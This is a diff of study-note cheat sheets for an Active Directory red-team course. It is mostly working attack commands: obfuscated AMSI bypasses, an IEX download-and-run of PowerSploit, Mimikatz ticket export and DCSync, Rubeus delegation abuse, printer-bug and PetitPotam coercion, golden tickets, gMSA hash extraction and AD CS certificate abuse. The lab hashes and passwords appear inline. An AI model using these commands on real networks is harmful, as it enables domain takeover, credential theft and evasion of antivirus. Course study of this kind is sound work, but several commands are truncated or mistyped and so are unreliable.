@@ -11,21 +11,6 @@ tags: [Cheatsheet, Study Notes, Altered Security]
 
 >   PowerShell is NOT `powershell.exe`. It is the `System.Management.Automation.dll`
 
-### Different ways to access PowerShell
-
--   `[ADSI]`
--   `.NET Classes `- `System.DirectoryServices.ActiveDirectory`
--   Native Executable
--   `WMI` using PowerShell
--   `ActiveDirectory` Module
-
-### PowerShell Detections
-
--   System-wide transcription
--   Script Block logging
--   AntiMalware Scan Interface (AMSI)
--   Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
-
 ### Bypassing Execution Policy
 
 >   It is NOT a security measure, it is present to prevent user from accidently executing scripts.
@@ -49,16 +34,6 @@ RunWithRegistryNonAdmin.bat
 ```
 
 ### Bypassing AV Signatures for PowerShell
-
--   Typical steps to bypass signature based detections
-    1.  Scan using `AMSITrigger`
-    2.  Modify the detected code snippet
-        -   Base64 Encode
-        -   Hex Encode
-        -   Concatenation
-        -   Reversing String
-    3.  Rescan using `AMSITrigger`
-    4.  Repeat the steps 2 & 3 till we get a result as “`AMSI_RESULT_NOT_DETECTED`” or “`Blank`”
 
 ##### Base64 Encoding
 
@@ -122,7 +97,7 @@ testing payload
 
 ```powershell
 # What we want
-PS:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# PS:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 # Replace AmsiUtils and amsiInitFailed with the base64 encoded payload and concat the rest of the string
 PS:\> [Ref].Assembly.GetType($('System.Management.Automation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)
@@ -135,12 +110,6 @@ PS:\> IEX(iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit
 
 ```powershell
 PS:\> $w = 'System.Manag';$r = '65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_};$c = 'Amsi'+'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}{2}' -f $w,$s,$c));$n = $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAA==')));$b = 'siIn';$k = (([regex]::Matches("deliaFti",'.','RightToLeft') | foreach {$_.value}) -join '');$field = $assembly.GetField(('{0}{1}{2}' -f $n,$b,$k),'NonPublic,Static');$field.SetValue($null,$true)
-
-# $r = converting hexadecimal values to string `ement.Automation`
-# $assembly = concat of System.Management.Automation and AmsiUtils
-# $n = am
-# $k = reverse the string to `itFailed`
-# $field = concat of am + siIn + itFailed
 ```
 
 ### Patching Event Tracing For Windows
@@ -209,32 +178,13 @@ Get-NetDomain -Domain moneycorp.local
 Get-DomainSID
 ```
 
-###### Get domain policy for the current domain
-
-```powershell
-Get-DomainPolicy
-(Get-DomainPolicy)."system access"
-```
-
-###### Get domain policy for another domain
-
-```powershell
-(Get-DomainPolicy -domain moneycorp.local)."system access"
-(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
-(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"
-# OR
-(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
-(Get-DomainPolicy)."SystemAccess" #Password policy
-(Get-DomainPolicy).PrivilegeRights #Check your privileges
-```
-
-###### Get domain controllers for the current domain
+###### Get DC for the current domain
 
 ```powershell
 Get-NetDomainController
 ```
 
-###### Get domain controllers for another domain
+###### Get DC for another domain
 
 ```powershell
 Get-NetDomainController -Domain moneycorp.local
@@ -252,8 +202,6 @@ Get-NetUser -Username student1
 ```powershell
 Get-UserProperty
 Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
-Get-UserProperty -Properties logoncount
-Get-UserProperty -Properties badpwdcount
 ```
 
 ###### Search for a particular string in a user's attributes
@@ -294,8 +242,7 @@ Get-NetGroup -GroupName *admin* -Doamin moneycorp.local
 
 ```powershell
 Get-NetGroupMember -GroupName "Domain Admins" -Recurse
-#test the below command
-#Get-NetGroupMember -GroupName "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members
+Get-NetGroupMember -GroupName "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members
 ```
 
 
@@ -305,45 +252,28 @@ Get-NetGroupMember -GroupName "Domain Admins" -Recurse
 Get-NetGroup -UserName "student1"
 ```
 
-###### List all the local groups on a machine (needs administrator privs on non-dc machines) 
+###### List all the local groups on a machine (needs admin privilege) 
 
 ```powershell
 Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
 ```
 
-###### Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
+###### Get members of all the local groups on a machine (needs admin privilege)
 
 ```powershell
 Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
 ```
 
-###### Get actively logged users on a computer (needs local admin rights on the target)
+###### Get actively logged users on a computer (needs local admin rights)
 
 ```powershell
 Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
 ```
 
-###### Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
-
-```powershell
-Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
-```
-
-###### Get the last logged user on a computer (needs administrative rights and remote registry on the target)
-
-```powershell
-Get-LastLoggedon -ComputerName <servername>
-```
-
-###### Find shares on hosts in current domain.
+###### Find sensitive files and shares in current domain.
 
 ```powershell
 Invoke-ShareFinder -Verbose
-```
-
-###### Find sensitive files on computers in the domain
-
-```powershell
 Invoke-FileFinder -Verbose
 ```
 
@@ -661,12 +591,6 @@ Write-Output "Hello from the function"
 Invoke-Command -ScriptBlock ${function:hello} -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ```
 
-##### In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way
-
-```powershell
-Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list of servers>) -ArgumentList
-```
-
 ##### Directly load function on the remote machines using FilePath
 
 ```powershell
@@ -865,26 +789,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt
 '.\2-40a10000-studentuser@USSvc~serviceaccount￾US.TECHCORP.LOCAL.kirbi
 ```
 
-
-
 ### Unconstrained Delegation
-
-##### Methodology/Steps using PowerShell
-
->   1.  For an example we have machine pwn1 as an Unconstrained user; We are pwn0 and we got foot-hold/credentials/hashes for machine pwn2 who has local admin access for machine pwn1; Hence we can perform this attack
->   2.  Get a Powershell session as a different user using **"Over pass the hash"** attack if required (in this case its **pwn2/appadmin**)
->   3.  We can try searching for local admins it has access to using **Find-LocalAdminAccess -Verbose**
->   4.  Create a **New-PSSession** attaching to the **"Unconstrained user"**
->   5.  Enter the new session using **Enter-PSSession**
->   6.  Bypass the *AMSI*
->   7.  EXIT
->   8.  Load **Mimikatz.ps1** on the new session using **Invoke-command**
->   9.  Enter the new session using **Enter-PSSession** *again*
->   10.  Now we can get the admin token and save it to the disk
->   11.  Try and check if you have any file from a DA
->   12.  If not we can try to pull if there is any sessions logged on as *Administrator* as pwn0 using **Invoke-Hunter** then run the attack again
->   13.  Once we get an DA token we can Reuse the token using **Invoke-Mimikatz**
->   14.  Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or use **WMI-Commands** / **ScriptBlock:Not sure**
 
 ##### PowerView
 
@@ -892,15 +797,14 @@ python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt
 
 ```powershell
 Get-NetComputer -UnConstrained
-
-# Ignore the domain controllers if they apeare in the list as they have Unconstrained Delegation enabled
 ```
 
 ###### Check if a token is available and save to disk
 
->   **Get admin token** After compromising the computer with UD enabled, we can trick or wait for an admin connection
+>   **Get admin token** after compromising the computer with UD enabled, we can trick or wait for an admin connection
 
 ```powershell
+# After admin connects
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
@@ -910,56 +814,38 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 Invoke-Mimikatz -Command '"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'
 ```
 
-##### Invoke-Hunter
+##### Abusing Printer Bug
 
-###### Pull any sessions if logged on with administrator/ Printer Bug
+###### Start Rubeus in monitoring mode
 
 ```powershell
-Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
+# Capture the TGT
+.\Rubeus.exe monitor /interval:5
 ```
 
-##### Methodology/Steps using Binaries
-
->   1.  Set Rubeus on monitor mode
->   2.  Run Print Bug using MS-RPRN or PetitPotman
->   3.  You will get the TGT on rubues
->   4.  Copy and inject that into memory using */ppt* or do it manually
->   5.  Now you can access the shares or do a DCSync Attack
-
-------
-
-##### Print Bug
-
-###### 1. MS-RPRN
+###### MS-RPRN
 
 >   https://github.com/leechristensen/SpoolSample
 
 ```powershell
-MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
+.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
 ```
 
 OR
 
-###### 1. PetitPotam
+###### PetitPotam
 
 >   https://github.com/topotam/PetitPotam
 
 ```powershell
-PetitPotam.exe us-web us-dc
-
-# PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC
+.\PetitPotam.exe us-web us-dc
 ```
 
-##### Rubeus
-
-###### 2. Capture the TGT and Jump or Run DCsync
+###### Capture the TGT run DCSync
 
 ```powershell
-# Captute the TGT
-Rubeus.exe monitor /interval:5
-
-# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine
-Rubeus.exe ptt /tikcet:
+# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker machine
+.\Rubeus.exe ptt /ticket:
 
 # OR use Invoke-Mimikatz
 [IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",[Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
@@ -969,19 +855,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 ```
 
-### Constrained Delegation
-
-##### Methodology/Steps using PowerShell
-
->   1.  List all the users having Constrained Delegation
->   2.  Keep a note of the **msDS-AllowedToDelegateTo** value
->   3.  Request for a TGT using the hash of the user with CD using kekeo (Which me must have collected before)
->   4.  Keep a note of the TGT return ticket
->   5.  Now request a TGS with the 2nd step and 4th step values as parameters in */service* and */tgt*
->   6.  Keep a note of the TGS return Ticket
->   7.  Now we can inject the TGS return Ticket with **Inkove-Mimikatz**
->   8.  We can now list the file systems of that account. Example : **`ls \\dc-mysql\C$`** but *can not* use any **WMI-Commands**. We can use *ScriptBlock* to execute commands on the system.
->   9.  But if the user DC we can do the same process and then do a **DCSync** attack
+### Constrained Delegation with Protocol Transition
 
 ##### PowerView
 
@@ -992,20 +866,20 @@ Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 ```
 
-##### kekeo
+##### Kekeo
 
 ###### Requesting a TGT
 
 ```powershell
-tgt::ask /user:websvc /domain:domain.local /rc4:cc098f204c5887eaa8253e7c2749156f
-tgt::ask /user:dcorp-adminsrv /domain:domain.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
+# Reqyest a TGT for the first hop service account
+tgt::ask /user:appsvc /domain:us.techcorp.local
+/rc4:1D49D390AC01D568F0EE9BE82BB74D4C 
 ```
 
 ###### Request a TGS
 
 ```powershell
-tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL
-tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.domain.LOCAL|ldap/computer.domain.LOCAL
+tgs::s4u /tgt:TGT_appsvc@US.TECHCORP.LOCAL_krbtgt~us.techcorp.local@US.TECHCORP.LOCAL.kirbi /user:Administrator /service:CIFS/us-mssql.us.techcorp.local|HTTP/us-mssql.us.techcorp.local 
 ```
 
 ##### Invoke-Mimikatz
@@ -1013,7 +887,7 @@ tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.
 ###### Inject the ticket
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::ptt TGS.kirbi"'
+Invoke-Mimikatz '"kerberos::ptt  TGS_Administrator@US.TECHCORP.LOCAL_HTTP~us-mssql.us.techcorp.local@US.TECHCORP.LOCAL_ALT.kirbi"' 
 ```
 
 ###### Execute DCSync
@@ -1028,25 +902,54 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 Inoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local
 ```
 
-##### Methodology/Steps using Binaries
-
->   1.  Use Rubeus to request a TGS for the user and inject it into memory
->   2.  Remote login the machine using `winrs`
-
-------
-
 ##### Rubeus
 
 ###### 1. Request for a `S4U`
 
 ```powershell
-Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
+Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt 
 ```
 
 ###### 2. Remote login using `winrs`
 
 ```powershell
 winrs -r:us-mssql cmd.exe
+```
+
+### Resource-based Constrained Delegation
+
+###### 1. Enumerate if we have Write permissions over any object.
+
+```powershell
+Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
+```
+
+###### 2. Using AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want
+
+```powershell
+.\Rubeus.exe s4u /user:student1$ /aes256:d10... /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
+
+winrs -r:us-helpdesk cmd.exe
+```
+
+### Constrained Delegation with Kerberos Only
+
+###### 1. Assume we have already compromised us-mgmt. We want to configure RBCD on us-mgmt using us-mgmt$ computer account.
+
+```powershell
+# Configure RBCD on us-mgmt using us-mgmt$ computer account.
+C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$ /aes256Lcc3.. /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap
+
+Set-ADComputer -Identity us-mgmt$ -PrincipalsAllowedToDelegateToAccount studentcompx$ -Verbose
+```
+
+###### 2. Request a new forwardable TGS/Service Ticket by leveraging the ticket created.
+
+```powershell
+C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxj... /user:us-mgmt$ /aes256:cc3... /msdsspn:cifs/us-mssql.us.techcorp.local /alterservice:http /nowrap /ptt
+
+# Access the us-mssql using WinRM as the Domain Admin
+winrs -r:us-mssql.us.techcorp.local cmd.exe
 ```
 
 ### LAPS (Local Administrator Password Solution)
@@ -1093,7 +996,46 @@ Get-AdmPwdPassword -ComputerName <targetmachine>
 
 ### gMSA (group Managed Service Account)
 
-page 148
+##### Methodology
+
+>   1.   A `gMSA` has a object class `msDS-GroupManagedServiceAccount`.
+>   2.   The attribute `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) list the principals that can read the password blob.
+>   3.   The attribute ‘`msDS-ManagedPassword` stores the password blob in binary form of `MSDS-MANAGEDPASSWORD_BLOB`.
+>   4.   Once we compromised a principal that can read the blob, use `DSInternals` to compute the NTLM hash.
+>   5.   Pass the NTLM hash of `gMSA` and get the privileges.
+
+###### 1. Enumeration of account
+
+```powershell
+# Using ADModule
+Get-ADServiceAccount -Filter *
+
+# Using PowerView
+Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
+```
+
+###### 2. Enumerate password blob
+
+```powershell
+# List principals that can read the password blob
+Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
+```
+
+###### 3. Compute NTLM hash from password blob
+
+```powershell
+$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
+Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
+$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordlob ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
+```
+
+###### 4. Pass the Hash
+
+```powershell
+sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c...
+```
+
+
 
 ### MS Exchange
 
@@ -1102,7 +1044,7 @@ page 148
 >   1.  Load in [MailSniper](https://github.com/dafthack/MailSniper) using powershell
 >   2.  Enumerate and pull all the emails
 >   3.  Save all the emails in a file called emails.txt
->   4.  Now check if you have access to any other emailboxes
+>   4.  Now check if you have access to any other mailboxes
 >   5.  Check for data inside the email address where the body contains data like password or creds
 
 ------
@@ -1131,15 +1073,6 @@ Invoke-SelfSearch -Mailbox pwnadmin@techcorp.local -ExchHostname us-exchange -Ou
 
 ### Resource Based Constrained Delegation
 
-##### Methodology/Steps using PowerShell
-
->   1.  Enumerate the users and identify if you have write perms on any object
->   2.  Create a list of all the systems where you have write perms
->   3.  Store that in $comps variable
->   4.  Set RBCD on all of these systems
->   5.  Now we can dump the AES keys for the student system ( Remember: Copy the AES key for the system account and not the Virtual Account, you can identify it by the SID. The SID of the system account will be shorter)
->   6.  Using Rubeus we can generate a HTTP s4u and get a connection using winrs. If you want to extract more secrets from that system you need to generate a CIFS s4u to transfer files on the system.
-
 ###### 1. Enumerate if we have Write permissions over any object
 
 ```powershell
@@ -1150,7 +1083,7 @@ Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
 ###### 2. Configure RBCD on us-helpdesk for student machines
 
 ```powershell
-# AD Module
+# Using AD Module
 $comps = 'student1$','student2$'
 Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps
 ```
@@ -1173,7 +1106,7 @@ SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
 >   Use the AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want
 
 ```powershell
-Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
+.\Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
 ```
 
 ###### 5. Winrs
@@ -1186,19 +1119,51 @@ winrs -r:us-helpdesk cmd.exe
 
 # VII. Domain Persistence
 
+### msDS-AllowedToDelegateTo
+
+##### PowerView
+
+```powershell
+Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
+Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us￾dc.us.techcorp.local"}
+Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
+
+Get-DomainUser –TrustedToAuth
+```
+
+##### Kekeo
+
+```powershell
+kekeo# tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!
+kekeo# tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techcorp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local
+
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~us-dc.us.techcorp.local@us.techcorp.local.kirbi"'
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' 
+```
+
+##### Rubeus
+
+```powershell
+Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local 
+
+Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6
+/impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt 
+
+.\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit" 
+```
+
 ### Golden Ticket 
 
 ##### Methodology/Steps
 
-> 1. Get a Powershell session as a **"domain admin"** using **"Over pass the hash"** attack
+> 1. Get a Powershell session as a **DA** using **Over PtH** attack
 >
-> 2. Create a **New-PSSession** attaching to the **"domain controller"**
+> 2. Create a **New-PSSession** attaching to the **DC**
 >
 > 3. Enter the new session using **Enter-PSSession** 
 >
-> 4. Bypass the *AMSI* 
->
-> 5. Exit
+> 4. Bypass the *AMSI*  and exit.
 >
 > 6. Load **Mimikatz.ps1** on the new session using **Invoke-command**
 >
@@ -1217,7 +1182,7 @@ winrs -r:us-helpdesk cmd.exe
 > 13. Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or 
 >
 >     ```powershell
->     PsExec64.exe \\prodsrv.garrison.castle.local -u GARRISON\prodadmin -p Password1! cmd
+>    PsExec64.exe \\prodsrv.garrison.castle.local -u GARRISON\prodadmin -p Password1! cmd
 >     ```
 
 ---
@@ -1257,7 +1222,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 klist
 ```
 
-###### To use the DCSync feature for getting krbtg hash execute the below command with DA privileges
+###### To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges
 
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
@@ -1368,7 +1333,7 @@ Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc
 
 > 1. Enumerate the users accounts who have **MSOL_** attribute identity.
 > 2. Start a process with the priv of that user
-> 3. Execute adconnect ps1 script, this will provide the creds of the user
+> 3. Execute adconnect.ps1 script, this will provide the creds of the user
 > 4. Connect using runas and perform a DCSync Attack
 
 ---
@@ -1465,20 +1430,6 @@ Write-Host ("Password: " + $password.Password)
 -   AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
 -   "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."
 
-##### NTAuthCertificates
-
--   An enterprise certificate authority generates a self signed certificate that is then included into the *NTAuthCertificates* Object into the Domain.
--   These are certificates that enable authentication for Active Directory
--   The **root** CA is the *DC-CA*
--   The **subordinate** CA is the *CA-CA*
--   Both of these, the private key associated with the certificates can be used to sign certificates that then can be used to allow authentication for Active Directory.
-
-##### Certificate Enrollment
-
-1.  The client needs to generate a public/private key pair.
-2.  Then the client needs to generate a CSR, also known as Certificate Signing Request. Its basically a message which contains information about the certificate they want to request. i.e. Like what its used for, example code signing, TLS. Contains info like the subject of the certificate or who ever is requesting the certificate. It also has a field which contains the template. In this step the CSR is sent to the Enterprise CA. The CA takes a look at the template, the template is basically a blueprint of settings that the certificate is going to have once its issued.
-3.  Assuming everything is correct and conforming if the user is allowed to obtain a certificate for what they are requesting. The CA will then sign a certificate using its private key and return it back to the client.
-
 ##### Using Rubeus to request for a certificate
 
 -   Rubeus and Kekeo support Kerberos authentication using certificates via PKINIT
@@ -1496,7 +1447,7 @@ Rubeus.exe asktgt /user:admin /certificate:C:\Temp\cert.pfx /password:password
 
 ##### **"Active"** Certificate Theft
 
--   Users/machines can enroll in any template they have Enroll permissions for
+-   Users/machines can enrol in any template they have Enrol permissions for
     -   By default the User and Machine templates are available
 -   We want a template that allows for AD authentication
     -   Lets us get a user’s TGT (and NTLM!)
@@ -1512,25 +1463,16 @@ Certify.exe request /ca:da.theshrine.local\theshrine-DC-CA /template:user
 
 1.  Doesn’t touch `lsass.exe`’s memory!
 2.  Doesn’t need elevation (for user contexts)!
-3.  Few existing detection methods! (*currently* lesser known technique : )
+3.  Few existing detection methods! (*currently* lesser known technique)
 4.  Separate credential material from passwords
     1.  Works even if an account changes its password!
     2.  Long lifetime. By default, User/Machine templates issue certificates valid for 1 year.
 
 ### AD CS Abuse
 
--   There are various ways of abusing ADCS!
-    -   Extract user and machine certificates
-    -   Use certificates to retrieve NTLM hash
-    -   User and machine level persistence
-    -   Escalation to Domain Admin and Enterprise Admin
-    -   Domain persistence
-
-
-
 ##### Methodology
 
->   1.  Find vulnerable cert templates, keep note of the Template name
+>   1.  Find vulnerable cert templates.
 >   2.  Request a template with the template name and using altname specify the user you want to attack
 >   3.  Using openssl generate the pfx from the private key and sign it with a password
 >   4.  Using Rubeus request a tgt with the admin pfx and inject it into the session
@@ -1859,9 +1801,8 @@ Import-Module .\PowerUpSQL.psd1
 
 ##### Methodology/Steps
 
->   1.  Check the SPN's
->   2.  Check which SPN's you have access to
->   3.  Check the Privileges you have of the above filtered SPN's
+>   1.  Check the SPN's and check which SPN's you have access to
+>   3.  Check the Privileges you have of the filtered SPN's
 >   4.  Keep note of the **Instance-Name**, **ServicePrincipalName** and the **DomainAccount-Name**
 >   5.  If you find any service with *higher privileges* continue below to abuse it
 
@@ -1882,7 +1823,7 @@ Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 ```
 
-###### 3. Check Privileges / Gather Infromation
+###### 3. Check Privileges / Gather Information
 
 ```powershell
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
